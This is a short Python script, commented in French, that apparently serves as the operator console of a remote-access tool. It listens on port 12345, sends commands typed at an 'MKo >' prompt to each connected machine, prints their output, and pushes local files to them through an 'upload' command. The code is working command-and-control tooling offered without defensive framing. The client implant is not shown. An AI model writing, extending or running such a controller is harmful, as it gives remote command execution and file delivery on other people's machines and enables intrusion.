import socket
import threading
import os

def handle_client(conn, addr):
    print(f"[+] Connexion établie avec {addr[0]}:{addr[1]}")
    conn.send(b"Bonjour, bienvenue sur le serveur !")
    while True:
        command = input("MKo > ")
        if command == "exit":
            break

        if command.startswith("upload"):
            file_path = command.split(" ")[1]
            if not os.path.isfile(file_path):
                print(f"Le fichier {file_path} n'existe pas.")
                continue

            print(f"Uploading {file_path}...")
            conn.send(command.encode('utf-8'))

            file_size = os.path.getsize(file_path)
            conn.send(file_size.to_bytes(8, 'big'))
            print(f"Sent file size: {file_size} bytes")

            with open(file_path, "rb") as file:
                while (chunk := file.read(1024)):
                    conn.send(chunk)

            print("File uploaded successfully")

        else:
            conn.send(command.encode('utf-8'))
            output = conn.recv(4096).decode('utf-8')
            print(output)

    conn.close()

host = '0.0.0.0'
port = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)

print(f"[+] En attente de connexion sur le port {port}...")
while True:
    conn, addr = s.accept()
    thread = threading.Thread(target=handle_client, args=(conn, addr))
    thread.start()

    # afficher le nombre de threads actifs
    print(f"[+] Threads actifs: {threading.active_count() - 1}")
